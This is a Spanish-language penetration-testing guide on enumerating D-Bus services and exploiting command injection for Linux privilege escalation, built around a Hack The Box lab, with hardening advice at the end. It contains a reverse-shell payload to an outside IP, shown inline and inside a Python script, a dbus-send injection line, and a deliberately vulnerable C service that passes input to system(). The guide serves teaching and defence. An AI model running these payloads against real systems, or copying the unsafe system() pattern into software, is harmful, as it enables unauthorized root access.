# Enumeración de D-Bus e inyección de comandos para la escalada de privilegios

{{#include ../../banners/hacktricks-training.md}}

## **Enumeración mediante GUI**

D-Bus se utiliza como mediador de comunicaciones entre procesos (IPC) en los entornos de escritorio de Ubuntu. En Ubuntu, se observa el funcionamiento simultáneo de varios message buses: el system bus, utilizado principalmente por **servicios privilegiados para exponer servicios relevantes para todo el sistema**, y un session bus para cada usuario conectado, que expone servicios relevantes únicamente para ese usuario específico. El enfoque aquí se centra principalmente en el system bus debido a su asociación con servicios que se ejecutan con privilegios elevados (por ejemplo, root), ya que nuestro objetivo es elevar privilegios. Cabe señalar que la arquitectura de D-Bus emplea un 'router' por cada session bus, cuya función es redirigir los mensajes de los clientes a los servicios adecuados basándose en la dirección especificada por los clientes para el servicio con el que desean comunicarse.

Los servicios en D-Bus se definen mediante los **objetos** y las **interfaces** que exponen. Los objetos pueden compararse con instancias de clases en los lenguajes estándar de OOP, y cada instancia se identifica de forma única mediante un **object path**. Esta ruta, similar a una ruta del sistema de archivos, identifica de forma única cada objeto expuesto por el servicio. Una interface clave para fines de investigación es la interface **org.freedesktop.DBus.Introspectable**, que cuenta con un único método, Introspect. Este método devuelve una representación XML de los métodos, señales y propiedades compatibles con el objeto; aquí nos centraremos en los métodos, omitiendo las propiedades y las señales.

Para comunicarse con la interface de D-Bus, se emplearon dos herramientas: una herramienta CLI llamada **gdbus**, para invocar fácilmente en scripts los métodos expuestos por D-Bus, y [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), una herramienta GUI basada en Python diseñada para enumerar los servicios disponibles en cada bus y mostrar los objetos contenidos en cada servicio.
```bash
sudo apt-get install d-feet
```
Si estás comprobando el **session bus**, confirma primero la dirección actual:
```bash
echo "$DBUS_SESSION_BUS_ADDRESS"
```
![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)

En la primera imagen se muestran los servicios registrados con el bus del sistema D-Bus, con **org.debin.apt** específicamente resaltado después de seleccionar el botón System Bus. D-Feet consulta este servicio en busca de objetos y muestra las interfaces, métodos, propiedades y señales de los objetos seleccionados, como se ve en la segunda imagen. También se detalla la signature de cada método.

Una característica destacable es la visualización del **process ID (pid)** y la **command line** del servicio, lo que resulta útil para confirmar si el servicio se ejecuta con privilegios elevados, algo importante para la relevancia de la investigación.

**D-Feet también permite invocar métodos**: los usuarios pueden introducir expresiones de Python como parámetros, que D-Feet convierte a tipos D-Bus antes de pasarlos al servicio.

Sin embargo, ten en cuenta que **algunos métodos requieren autenticación** antes de permitir su invocación. Ignoraremos estos métodos, ya que nuestro objetivo es elevar nuestros privilegios sin credenciales en primer lugar.

Ten en cuenta también que algunos servicios consultan otro servicio D-Bus llamado org.freedeskto.PolicyKit1 para determinar si se debe permitir o no que un usuario realice determinadas acciones.

## **Enumeración de la línea de comandos**

### Listar objetos de servicios

Es posible listar las interfaces D-Bus abiertas con:
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```
Los servicios marcados como **`(activatable)`** son especialmente interesantes porque **todavía no se están ejecutando**, pero una solicitud al bus puede iniciarlos bajo demanda. No te limites a `busctl list`; relaciona esos nombres con los binarios reales que ejecutarían.
```bash
ls -la /usr/share/dbus-1/system-services/ /usr/share/dbus-1/services/ 2>/dev/null
grep -RInE '^(Name|Exec|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
```
Eso te indica rápidamente qué ruta `Exec=` se iniciará para un nombre activatable y bajo qué identidad. Si el binario o su cadena de ejecución están débilmente protegidos, un servicio inactivo aún puede convertirse en una vía de privilege escalation.

#### Conexiones

[De wikipedia:](https://en.wikipedia.org/wiki/D-Bus) Cuando un proceso establece una conexión con un bus, el bus asigna a la conexión un nombre de bus especial llamado _nombre de conexión único_. Los nombres de bus de este tipo son inmutables: se garantiza que no cambiarán mientras exista la conexión y, lo que es más importante, no se pueden reutilizar durante la vida útil del bus. Esto significa que ninguna otra conexión a ese bus tendrá asignado ese nombre de conexión único, incluso si el mismo proceso cierra la conexión con el bus y crea una nueva. Los nombres de conexión únicos son fáciles de reconocer porque comienzan con el carácter de dos puntos, que de otro modo está prohibido.

### Información del objeto del servicio

A continuación, puedes obtener información sobre la interfaz con:
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
```
También relaciona el nombre del bus con su unidad de `systemd` y la ruta del ejecutable:
```bash
systemctl status dbus-server.service --no-pager
systemctl cat dbus-server.service
namei -l /root/dbus-server
```
Esto responde a la pregunta operativa importante durante el **privesc**: **si una llamada a un método tiene éxito, ¿qué binario y unidad reales realizarán la acción?**

### Listar las interfaces de un objeto de servicio

Necesitas tener permisos suficientes.
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
└─/htb/oouch
└─/htb/oouch/Block
```
### Inspeccionar la interfaz de un objeto de servicio

Observa que en este ejemplo se seleccionó la última interfaz descubierta mediante el parámetro `tree` (_consulta la sección anterior_):
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
Observa el método `.Block` de la interfaz `htb.oouch.Block` (el que nos interesa). La "s" de las otras columnas puede indicar que espera un string.

Antes de intentar algo peligroso, valida primero un método **orientado a la lectura** o de bajo riesgo. Esto separa claramente tres casos: sintaxis incorrecta, accesible pero denegado, o accesible y permitido.
```bash
busctl call org.freedesktop.login1 /org/freedesktop/login1 org.freedesktop.login1.Manager CanReboot
gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
```
### Correlacionar los métodos de D-Bus con las Policies y las Actions

La introspección te indica **qué** puedes llamar, pero no te indica **por qué** una llamada está permitida o denegada. Para un triage real de privesc normalmente necesitas inspeccionar **tres capas conjuntamente**:

1. **Metadatos de activación** (archivos `.service` o `SystemdService=`) para saber qué binario y unidad se ejecutarán realmente.
2. **Policy XML de D-Bus** (`/etc/dbus-1/system.d/`, `/usr/share/dbus-1/system.d/`) para saber quién puede hacer `own`, `send_destination` o `receive_sender`.
3. **Archivos de actions de Polkit** (`/usr/share/polkit-1/actions/*.policy`) para conocer el modelo de autorización predeterminado (`allow_active`, `allow_inactive`, `auth_admin`, `auth_self`, `org.freedesktop.policykit.imply`).

Comandos útiles:
```bash
grep -RInE '^(Name|Exec|SystemdService|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
grep -RInE '<(allow|deny) (own|send_destination|receive_sender)=|user=|group=' /etc/dbus-1/system.d /usr/share/dbus-1/system.d /etc/dbus-1/system-local.d 2>/dev/null
grep -RInE 'allow_active|allow_inactive|auth_admin|auth_self|org\.freedesktop\.policykit\.imply' /usr/share/polkit-1/actions 2>/dev/null
pkaction --verbose
```
No **asumas** una correspondencia 1:1 entre un método de D-Bus y una acción de Polkit. El mismo método puede elegir una acción diferente dependiendo del objeto que se modifique o del contexto de ejecución. Por lo tanto, el flujo de trabajo práctico es:

1. `busctl introspect` / `gdbus introspect`
2. `pkaction --verbose` y buscar con grep en los archivos `.policy` relevantes
3. sondeos en vivo de bajo riesgo con `busctl call`, `gdbus call` o `dbusmap --enable-probes --null-agent`

Los servicios proxy o de compatibilidad merecen especial atención. Un **proxy que se ejecuta como root** y reenvía solicitudes a otro servicio D-Bus mediante su propia conexión preestablecida puede hacer accidentalmente que el backend trate cada solicitud como si procediera del UID 0, a menos que se vuelva a validar la identidad del llamador original.

### Interfaz de monitorización/captura

Con suficientes privilegios (los privilegios `send_destination` y `receive_sender` por sí solos no son suficientes) puedes **monitorizar una comunicación de D-Bus**.

Para **monitorizar** una **comunicación**, necesitarás ser **root**. Si sigues teniendo problemas siendo root, consulta [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) y [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)

> [!WARNING]
> Si sabes cómo configurar un archivo de configuración de D-Bus para **permitir que usuarios que no sean root hagan sniffing** de la comunicación, ¡**contacta conmigo**!

Diferentes formas de monitorizar:
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
En el siguiente ejemplo, la interfaz `htb.oouch.Block` es monitorizada y **el mensaje "**_**lalalalal**_**" se envía mediante una comunicación errónea**:
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
UniqueName=:1.1376
MESSAGE "s" {
STRING "lalalalal";
};

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
Sender=:1.3  Destination=:1.1376
UniqueName=:1.3
MESSAGE "s" {
STRING "Carried out :D";
};
```
Puedes usar `capture` en lugar de `monitor` para guardar los resultados en un archivo **pcapng** que Wireshark puede abrir:
```bash
sudo busctl capture htb.oouch.Block > dbus-htb.oouch.Block.pcapng
sudo busctl capture > system-bus.pcapng
```
#### Filtrando todo el ruido <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

Si hay demasiada información en el bus, pasa una regla de coincidencia como esta:
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
Se pueden especificar varias reglas. Si un mensaje coincide con _cualquiera_ de las reglas, se imprimirá. De la siguiente manera:
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
Consulta la [documentación de D-Bus](http://dbus.freedesktop.org/doc/dbus-specification.html) para obtener más información sobre la sintaxis de las reglas de coincidencia.

### Más

`busctl` tiene aún más opciones; [**encuéntralas todas aquí**](https://www.freedesktop.org/software/systemd/man/busctl.html).

## **Escenario vulnerable**

Como usuario **qtc dentro del host "oouch" de HTB**, puedes encontrar un **archivo de configuración de D-Bus inesperado** ubicado en _/etc/dbus-1/system.d/htb.oouch.Block.conf_:
```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

<policy user="root">
<allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
<allow send_destination="htb.oouch.Block"/>
<allow receive_sender="htb.oouch.Block"/>
</policy>

</busconfig>
```
Nota de la configuración anterior: **deberás ser el usuario `root` o `www-data` para enviar y recibir información** mediante esta comunicación D-BUS.

Como usuario **qtc** dentro del contenedor Docker **aeb4525789d8**, puedes encontrar código relacionado con dbus en el archivo _/code/oouch/routes.py._ Este es el código interesante:
```python
if primitive_xss.search(form.textfield.data):
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
return render_template('hacker.html', title='Hacker')
```
Como puedes ver, se está **conectando a una interfaz D-Bus** y enviando el `"client_ip"` a la función **"Block"**.

En el otro lado de la conexión D-Bus hay un binario compilado en C en ejecución. Este código está **escuchando** en la conexión D-Bus **una dirección IP y llama a iptables mediante la función `system`** para bloquear la dirección IP proporcionada.\
**La llamada a `system` es vulnerable intencionadamente a command injection**, por lo que un payload como el siguiente creará un reverse shell: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Exploit it

Al final de esta página puedes encontrar el **código C completo de la aplicación D-Bus**. Dentro de este código puedes encontrar, entre las líneas 91-97, **cómo se registran la `D-Bus object path`** **y el `interface name`**. Esta información será necesaria para enviar información a la conexión D-Bus:
```c
/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
```
Además, en la línea 57 puedes encontrar que **el único método registrado** para esta comunicación D-Bus se llama `Block`(_**Por eso, en la siguiente sección, los payloads se enviarán al objeto de servicio `htb.oouch.Block`, la interfaz `/htb/oouch/Block` y el nombre del método `Block`**_):
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

El siguiente código de Python enviará el payload a la conexión D-Bus, al método `Block`, mediante `block_iface.Block(runme)` (_ten en cuenta que se extrajo del fragmento de código anterior_):
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctl y dbus-send
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
- `dbus-send` es una herramienta utilizada para enviar mensajes al “Message Bus”.
- Message Bus: software utilizado por los sistemas para facilitar la comunicación entre aplicaciones. Está relacionado con Message Queue (los mensajes se ordenan en secuencia), pero en Message Bus los mensajes se envían mediante un modelo de suscripción y también de forma muy rápida.
- La etiqueta “-system” se utiliza para indicar que es un mensaje del sistema, no un mensaje de sesión (de forma predeterminada).
- La etiqueta “–print-reply” se utiliza para imprimir nuestro mensaje correctamente y recibir cualquier respuesta en un formato legible para humanos.
- “–dest=Dbus-Interface-Block”: la dirección de la interfaz de Dbus.
- “–string:”: tipo de mensaje que queremos enviar a la interfaz. Existen varios formatos para enviar mensajes, como double, bytes, booleans, int y objpath. De ellos, “object path” es útil cuando queremos enviar la ruta de un archivo a la interfaz de Dbus. En este caso, podemos utilizar un archivo especial (FIFO) para pasar un comando a la interfaz usando el nombre de un archivo. “string:;”: se utiliza para volver a llamar al object path, donde colocamos el archivo/comando de reverse shell FIFO.

_Ten en cuenta que, en `htb.oouch.Block.Block`, la primera parte (`htb.oouch.Block`) hace referencia al objeto de servicio y la última parte (`.Block`) hace referencia al nombre del método._

### Código C
```c:d-bus_server.c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
char* host = NULL;
int r;

/* Read the parameters */
r = sd_bus_message_read(m, "s", &host);
if (r < 0) {
fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
return r;
}

char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

int command_len = strlen(command);
int host_len = strlen(host);

char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
if(command_buffer == NULL) {
fprintf(stderr, "Failed to allocate memory\n");
return -1;
}

sprintf(command_buffer, command, host);

/* In the first implementation, we simply ran command using system(), since the expected DBus
* to be threading automatically. However, DBus does not thread and the application will hang
* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
* multithreading)
*/
int pid = fork();

if ( pid == 0 ) {
/* Here we are in the child process. We execute the command and eventually exit. */
system(command_buffer);
exit(0);
} else {
/* Here we are in the parent process or an error occured. We simply send a genric message.
* In the first implementation we returned separate error messages for success or failure.
* However, now we cannot wait for results of the system call. Therefore we simply return
* a generic. */
return sd_bus_reply_method_return(m, "s", "Carried out :D");
}
r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
SD_BUS_VTABLE_START(0),
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
/*
* Main method, registeres the htb.oouch.Block service on the system dbus.
*
* Paramaters:
*      argc            (int)             Number of arguments, not required
*      argv[]          (char**)          Argument array, not required
*
* Returns:
*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
*      as long as the user keeps it alive.
*/


/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
signal(SIGCHLD,SIG_IGN);

sd_bus_slot *slot = NULL;
sd_bus *bus = NULL;
int r;

/* First we need to connect to the system bus. */
r = sd_bus_open_system(&bus);
if (r < 0)
{
fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
goto finish;
}

/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
if (r < 0) {
fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
goto finish;
}

/* Register the service name to find out object */
r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
if (r < 0) {
fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
goto finish;
}

/* Infinite loop to process the client requests */
for (;;) {
/* Process requests */
r = sd_bus_process(bus, NULL);
if (r < 0) {
fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
goto finish;
}
if (r > 0) /* we processed a request, try to process another one, right-away */
continue;

/* Wait for the next request to process */
r = sd_bus_wait(bus, (uint64_t) -1);
if (r < 0) {
fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
goto finish;
}
}

finish:
sd_bus_slot_unref(slot);
sd_bus_unref(bus);

return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
## Helpers de Enumeración Automatizada (2023-2025)

Enumerar manualmente una gran superficie de ataque de D-Bus con `busctl`/`gdbus` se vuelve rápidamente tedioso. Dos pequeñas utilidades FOSS publicadas en los últimos años pueden agilizar el proceso durante engagements de red-team o CTF:

### dbusmap ("Nmap para D-Bus")
* Author: @taviso – [https://github.com/taviso/dbusmap](https://github.com/taviso/dbusmap)
* Escrito en C; binario estático único (<50 kB) que recorre cada ruta de objeto, obtiene el XML de `Introspect` y lo relaciona con el PID/UID propietario.
* Flags útiles:
```bash
# List every service on the *system* bus and dump all callable methods
sudo dbus-map --dump-methods

# Actively probe methods/properties you can reach without Polkit prompts
sudo dbus-map --enable-probes --null-agent --dump-methods --dump-properties
```
* La herramienta marca los nombres conocidos no protegidos con `!`, revelando al instante los servicios que puedes *own* (tomar el control) o las llamadas a métodos accesibles desde una shell sin privilegios.

### uptux.py
* Author: @initstring – [https://github.com/initstring/uptux](https://github.com/initstring/uptux)
* Script escrito únicamente en Python que busca rutas *writable* en unidades de systemd y archivos de políticas de D-Bus con permisos excesivos (por ejemplo, `send_destination="*"`).
* Uso rápido:
```bash
python3 uptux.py -n          # run all checks but don’t write a log file
python3 uptux.py -d          # enable verbose debug output
```
* El módulo de D-Bus busca en los directorios siguientes y destaca cualquier servicio que un usuario normal pueda suplantar o secuestrar:
* `/etc/dbus-1/system.d/` y `/usr/share/dbus-1/system.d/`
* `/etc/dbus-1/system-local.d/` (overrides del vendor)

---

## Bugs Destacables de Escalada de Privilegios en D-Bus (2024-2025)

Prestar atención a los CVE publicados recientemente ayuda a detectar patrones inseguros similares en código personalizado. Dos buenos ejemplos recientes son:

| Año | CVE | Componente | Causa raíz | Lección ofensiva |
|------|-----|-----------|------------|------------------|
| 2024 | CVE-2024-45752 | `logiops` ≤ 0.3.4 (`logid`) | El servicio ejecutado como root exponía una interfaz D-Bus que los usuarios sin privilegios podían reconfigurar, incluida la carga de comportamiento de macros controlado por el atacante. | Si un daemon expone **device/profile/config management** en el system bus, trata la configuración modificable y las funciones de macros como primitivas de code execution, no solo como "settings". |
| 2025 | CVE-2025-23222 | Deepin `dde-api-proxy` ≤ 1.0.19 | Un proxy de compatibilidad ejecutado como root reenviaba solicitudes a servicios backend sin conservar el contexto de seguridad del caller, por lo que los backends confiaban en el proxy como UID 0. | Trata los servicios D-Bus de tipo **proxy / bridge / compatibility** como una clase de bugs independiente: si retransmiten llamadas privilegiadas, verifica cómo llega el UID/contexto de Polkit del caller al backend. |

Patrones que conviene observar:
1. El servicio se ejecuta **como root en el system bus**.
2. No existe **ninguna comprobación de autorización**, o la comprobación se realiza contra el **subject equivocado**.
3. El método accesible termina modificando el estado del sistema: instalación de paquetes, cambios de usuarios/grupos, configuración del bootloader, actualizaciones del perfil del dispositivo, escrituras de archivos o ejecución directa de comandos.

Usa `dbusmap --enable-probes` o `busctl call` manualmente para confirmar si un método es accesible; después inspecciona el XML de policy del servicio y las acciones de Polkit para entender **qué subject** está siendo autorizado realmente.

---

## Hardening y Detección: Victorias Rápidas

* Busca políticas *world-writable* o abiertas para *send/receive*:
```bash
grep -R --color -nE '<allow (own|send_destination|receive_sender)="[^"]*"' /etc/dbus-1/system.d /usr/share/dbus-1/system.d
```
* Requiere Polkit para los métodos peligrosos; incluso los proxies *root* deberían pasar el PID del *caller* a `polkit_authority_check_authorization_sync()` en lugar del suyo propio.
* Reduce los privilegios en helpers de larga ejecución (usa `sd_pid_get_owner_uid()` para cambiar de namespace después de conectarte al bus).
* Si no puedes eliminar un servicio, al menos delimítalo a un grupo Unix dedicado y restringe el acceso en su política XML.
* Blue-team: captura el system bus con `busctl capture > /var/log/dbus_$(date +%F).pcapng` e impórtalo en Wireshark para detectar anomalías.

---

## Referencias

- [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
- [https://github.com/PixlOne/logiops/issues/473](https://github.com/PixlOne/logiops/issues/473)
- [https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html](https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html)
{{#include ../../banners/hacktricks-training.md}}
